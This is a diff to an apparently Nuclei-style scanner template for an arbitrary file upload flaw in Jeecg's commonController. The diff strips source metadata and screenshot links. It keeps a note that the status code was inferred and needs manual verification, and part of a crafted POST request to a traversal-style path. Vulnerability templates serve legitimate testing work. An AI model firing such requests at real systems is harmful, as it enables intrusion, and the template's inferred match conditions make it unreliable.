@@ -3,13 +3,8 @@ info:
   name: Jeecg commonController 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oq0wo7ai0u9vp4b9
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oq0wo7ai0u9vp4b9
 http:
 - raw:
   - 'POST /api/../commonController.do?parserXml HTTP/1.1
@@ -69,13 +64,7 @@ http:
     ------WebKitFormBoundaryyfyhSCMs9cajzFD4--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057013023-9d676a9a-3950-46fd-be77-31ba56a13aee.png)
-
-
     1. 验证
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057013232-aa7d6405-cb2b-4f90-97cd-14bd31c8eaf0.png)
 
 
     ## 修复建议
